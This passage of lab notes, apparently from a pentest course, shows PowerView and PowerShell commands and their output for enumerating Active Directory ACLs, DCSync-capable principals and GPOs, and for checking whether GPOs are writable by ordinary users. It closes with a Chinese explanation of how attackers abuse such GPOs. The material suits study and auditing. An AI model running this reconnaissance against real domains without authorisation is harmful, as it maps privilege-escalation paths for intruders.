IsInherited           : False\
InheritanceFlags      : ContainerInherit\
PropagationFlags      : None

```

#### Check single user can abuse WriteProperty and GenericAll  's user ?  

CMD

```

PS C:\htb> (Get-ACL "AD:$((Get-ADUser daniel.carter).distinguishedname)").access  | ? {$*.ActiveDirectoryRights -match "WriteProperty" -or \$*.ActiveDirectoryRights -match "GenericAll"} | Select IdentityReference,ActiveDirectoryRights -Unique | ft -W

IdentityReference                                                                                            ActiveDirectoryRights

***

BUILTIN\Administrators                         CreateChild, DeleteChild, Self, WriteProperty, ExtendedRight, Delete, GenericRead,\
WriteDacl, WriteOwner\
INLANEFREIGHT\Domain Admins                 CreateChild, DeleteChild, Self, WriteProperty, ExtendedRight, GenericRead, WriteDacl,\
WriteOwner\
INLANEFREIGHT\Enterprise Admins             CreateChild, DeleteChild, Self, WriteProperty, ExtendedRight, GenericRead, WriteDacl,\
WriteOwner\
INLANEFREIGHT\cliff.moore                                                              ReadProperty, WriteProperty, GenericExecute\
NT AUTHORITY\SELF                                                                       ReadProperty, WriteProperty, ExtendedRight\
BUILTIN\Terminal Server License Servers                                                                ReadProperty, WriteProperty\
INLANEFREIGHT\Cert Publishers                                                                          ReadProperty, WriteProperty\
INLANEFREIGHT\Organization Management                                                                                WriteProperty\
INLANEFREIGHT\Exchange Servers                                                                                       WriteProperty\
INLANEFREIGHT\Exchange Servers                     CreateChild, DeleteChild, ListChildren, ReadProperty, WriteProperty, ListObject\
INLANEFREIGHT\Exchange Servers                                                     ReadProperty, WriteProperty, ListObject, Delete

```


#### Check the domain 's object which can be edited(it spend some time )

```

PS C:\Users\Administrator\Desktop> Find-InterestingDomainAcl -Domain test.local -ResolveGUIDs

ObjectDN                : CN=MicrosoftDNS,CN=System,DC=test,DC=local\
AceQualifier            : AccessAllowed\
ActiveDirectoryRights   : CreateChild, DeleteChild, ListChildren, ReadProperty, DeleteTree, ExtendedRight, Delete, GenericWrite, WriteDacl, WriteOwner\
ObjectAceType           : None\
AceFlags                : ContainerInherit\
AceType                 : AccessAllowed\
InheritanceFlags        : ContainerInherit\
SecurityIdentifier      : S-1-5-21-84984185-259362343-599180476-1101\
IdentityReferenceName   : DnsAdmins\
IdentityReferenceDomain : test.local\
IdentityReferenceDN     : CN=DnsAdmins,CN=Users,DC=test,DC=local\
IdentityReferenceClass  : group

ObjectDN                : DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=test,DC=local\
AceQualifier            : AccessAllowed\
ActiveDirectoryRights   : CreateChild, DeleteChild, ListChildren, ReadProperty, DeleteTree, ExtendedRight, Delete, GenericWrite, WriteDacl, WriteOwner\
ObjectAceType           : None\
AceFlags                : ContainerInherit, Inherited\
AceType                 : AccessAllowed\
InheritanceFlags        : ContainerInherit\
SecurityIdentifier      : S-1-5-21-84984185-259362343-599180476-1101\
IdentityReferenceName   : DnsAdmins\
IdentityReferenceDomain : test.local\
IdentityReferenceDN     : CN=DnsAdmins,CN=Users,DC=test,DC=local\
IdentityReferenceClass  : group

ObjectDN                : DC=@,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=test,DC=local\
AceQualifier            : AccessAllowed\
ActiveDirectoryRights   : CreateChild, DeleteChild, ListChildren, ReadProperty, DeleteTree, ExtendedRight, Delete, GenericWrite, WriteDacl, WriteOwner\
ObjectAceType           : None\
AceFlags                : ContainerInherit, Inherited\
AceType                 : AccessAllowed\
InheritanceFlags        : ContainerInherit\
SecurityIdentifier      : S-1-5-21-84984185-259362343-599180476-1101\
IdentityReferenceName   : DnsAdmins\
IdentityReferenceDomain : test.local\
IdentityReferenceDN     : CN=DnsAdmins,CN=Users,DC=test,DC=local\
IdentityReferenceClass  : group

```

#### Find enable DCSync attack  's user group 


```

PS C:\Users\Administrator\Desktop> $dcsync = Get-ObjectACL "DC=test,DC=local" -ResolveGUIDs | ? { ($\_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match 'Replication-Get')} | Select-Object -ExpandProperty SecurityIdentifier | Select -ExpandProperty value; Convert-SidToName $dcsync

TEST\Enterprise Read-only Domain Controllers\
TEST\Domain Controllers\
BUILTIN\Administrators\
BUILTIN\Administrators\
BUILTIN\Administrators\
Enterprise Domain Controllers\
Enterprise Domain Controllers\
TEST\Enterprise Admins\
Local System

```


### GPO Part 

### Enum all GPO 

```

PS C:\Users\Administrator\Desktop> Get-DomainGPO | select displayname

## displayname

Default Domain Policy\
Default Domain Controllers Policy\
New Group Policy Object\
test GPO

```


#### Find the single Computer 's GPO file path 


```

PS C:\Users\Administrator\Desktop> Get-DomainGPO -ComputerName WIN-6G6KPL3P3MA.test.local

usncreated               : 5675\
systemflags              : -1946157056\
displayname              : Default Domain Controllers Policy\
gpcmachineextensionnames : \[{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]\
whenchanged              : 7/25/2026 7:28:33 AM\
objectclass              : {top, container, groupPolicyContainer}\
gpcfunctionalityversion  : 2\
showinadvancedviewonly   : True\
usnchanged               : 16496\
dscorepropagationdata    : {7/17/2026 10:18:26 PM, 1/1/1601 12:00:00 AM}\
name                     : {6AC1786C-016F-11D2-945F-00C04fB984F9}\
flags                    : 0\
cn                       : {6AC1786C-016F-11D2-945F-00C04fB984F9}\
iscriticalsystemobject   : True\
gpcfilesyspath           : \test.local\sysvol\test.local\Policies{6AC1786C-016F-11D2-945F-00C04fB984F9}\
distinguishedname        : CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System,DC=test,DC=local\
whencreated              : 7/17/2026 10:17:22 PM\
versionnumber            : 5\
instancetype             : 4\
objectguid               : 42cbef3b-2434-4c9e-97b6-96521620573d\
objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=test,DC=local

usncreated               : 12863\
displayname              : test GPO\
gpcmachineextensionnames : \[{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]\
whenchanged              : 7/18/2026 7:27:23 AM\
objectclass              : {top, container, groupPolicyContainer}\
gpcfunctionalityversion  : 2\
showinadvancedviewonly   : True\
usnchanged               : 12876\
dscorepropagationdata    : 1/1/1601 12:00:00 AM\
name                     : {BB5460CC-F103-4383-95B9-4FE87454B461}\
flags                    : 0\
cn                       : {BB5460CC-F103-4383-95B9-4FE87454B461}\
gpcfilesyspath           : \test.local\SysVol\test.local\Policies{BB5460CC-F103-4383-95B9-4FE87454B461}\
distinguishedname        : CN={BB5460CC-F103-4383-95B9-4FE87454B461},CN=Policies,CN=System,DC=test,DC=local\
whencreated              : 7/18/2026 7:21:57 AM\
versionnumber            : 6\
instancetype             : 4\
objectguid               : b09f79be-2ba4-41d8-9cdb-d94bc9c9894a\
objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=test,DC=local

usncreated               : 5672\
systemflags              : -1946157056\
displayname              : Default Domain Policy\
gpcmachineextensionnames : \[{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{53D6AB1B-2488-11D1-A28C-00C04FB94F17}]\[{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]\[{B1BE8D72-6EAC-11D2-A\
4EA-00C04F79F83A}{53D6AB1B-2488-11D1-A28C-00C04FB94F17}]\
whenchanged              : 7/17/2026 10:23:15 PM\
objectclass              : {top, container, groupPolicyContainer}\
gpcfunctionalityversion  : 2\
showinadvancedviewonly   : True\
usnchanged               : 12737\
dscorepropagationdata    : {7/17/2026 10:18:26 PM, 1/1/1601 12:00:00 AM}\
name                     : {31B2F340-016D-11D2-945F-00C04FB984F9}\
flags                    : 0\
cn                       : {31B2F340-016D-11D2-945F-00C04FB984F9}\
iscriticalsystemobject   : True\
gpcfilesyspath           : \test.local\sysvol\test.local\Policies{31B2F340-016D-11D2-945F-00C04FB984F9}\
distinguishedname        : CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=test,DC=local\
whencreated              : 7/17/2026 10:17:22 PM\
versionnumber            : 3\
instancetype             : 4\
objectguid               : 7db064ec-2db1-4870-83b3-c4dc831f9ea2\
objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=test,DC=local

```


#### Find the Computer is used for what GPO 

```

PS C:\Users\Administrator\Desktop> gpresult  /r /s WIN-6G6KPL3P3MA.test.local

Microsoft (R) Windows (R) Operating System Group Policy Result tool v2.0\
© Microsoft Corporation. All rights reserved.

Created on ‎7/‎29/‎2026 at 12:26:42 AM

## RSOP data for TEST\administrator on WIN-6G6KPL3P3MA : Logging Mode

OS Configuration:            Primary Domain Controller\
OS Version:                  10.0.20348\
Site Name:                   Default-First-Site-Name\
Roaming Profile:             N/A\
Local Profile:               C:\Users\Administrator\
Connected over a slow link?: No

## COMPUTER SETTINGS

```
CN=WIN-6G6KPL3P3MA,OU=Domain Controllers,DC=test,DC=local
Last time Group Policy was applied: 7/29/2026 at 12:25:23 AM
Group Policy was applied from:      WIN-6G6KPL3P3MA.test.local
Group Policy slow link threshold:   500 kbps
Domain Name:                        TEST
Domain Type:                        Windows 2008 or later

Applied Group Policy Objects
-----------------------------
    test GPO
    Default Domain Controllers Policy
    Default Domain Policy

The following GPOs were not applied because they were filtered out
-------------------------------------------------------------------
    Local Group Policy
        Filtering:  Not Applied (Empty)

The computer is a part of the following security groups
-------------------------------------------------------
    BUILTIN\Administrators
    Everyone
    BUILTIN\Pre-Windows 2000 Compatible Access
    BUILTIN\Users
    Windows Authorization Access Group
    NT AUTHORITY\NETWORK
    NT AUTHORITY\Authenticated Users
    This Organization
    WIN-6G6KPL3P3MA$
    Domain Controllers
    NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS
    Authentication authority asserted identity
    Denied RODC Password Replication Group
    System Mandatory Level
```

## USER SETTINGS

```
CN=Administrator,CN=Users,DC=test,DC=local
Last time Group Policy was applied: 7/29/2026 at 12:26:15 AM
Group Policy was applied from:      WIN-6G6KPL3P3MA.test.local
Group Policy slow link threshold:   500 kbps
Domain Name:                        TEST
Domain Type:                        Windows 2008 or later

Applied Group Policy Objects
-----------------------------
    N/A

The following GPOs were not applied because they were filtered out
-------------------------------------------------------------------
    Local Group Policy
        Filtering:  Not Applied (Empty)

The user is a part of the following security groups
---------------------------------------------------
    Domain Users
    Everyone
    BUILTIN\Administrators
    BUILTIN\Users
    BUILTIN\Pre-Windows 2000 Compatible Access
    NT AUTHORITY\INTERACTIVE
    CONSOLE LOGON
    NT AUTHORITY\Authenticated Users
    This Organization
    LOCAL
    Domain Admins
    Group Policy Creator Owners
    Schema Admins
    Enterprise Admins
    Authentication authority asserted identity
    Denied RODC Password Replication Group
    High Mandatory Level
```

```

#### Find the special group 's GPO


```

PS C:\Users\Administrator\Desktop> Get-DomainGPO | Get-ObjectAcl | ? {$\_.SecurityIdentifier -eq 'S-1-5-21-2974783224-3764228556-2640795941-513'}\
PS C:\Users\Administrator\Desktop>

```

如果這個指令輸出任何顯示 `Write Property`、`WriteDacl` 或 `GenericAll` 等權限的項目，這些權限在 GPO 上授予網域使用者，表示任何標準且低權限的使用者都可以修改該群組政策物件。攻擊者經常檢查錯誤配置的 GPO ACL，以注入惡意啟動腳本、排程任務或使用者權限變更，導致網域間權限立即升級。




```
